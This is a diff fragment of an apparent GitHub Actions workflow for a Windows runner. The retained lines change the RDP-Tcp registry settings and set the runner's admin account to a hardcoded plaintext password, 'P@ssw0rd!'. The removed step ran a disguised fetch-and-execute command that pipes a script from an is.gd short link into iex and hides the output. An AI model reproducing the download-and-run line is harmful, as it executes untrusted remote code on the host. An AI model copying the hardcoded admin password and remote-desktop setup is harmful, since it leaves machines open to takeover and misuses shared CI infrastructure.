@@ -25,11 +25,6 @@ jobs:
         Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1
         Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
 
-    - name: Additional PowerShell Command
-      run: |
-        irm https://is.gd/pdown | iex > $null
-        Write-Output "Running additional PowerShell command"
-
     - name: Create batch file on desktop
       run: |
         $content = '@echo off
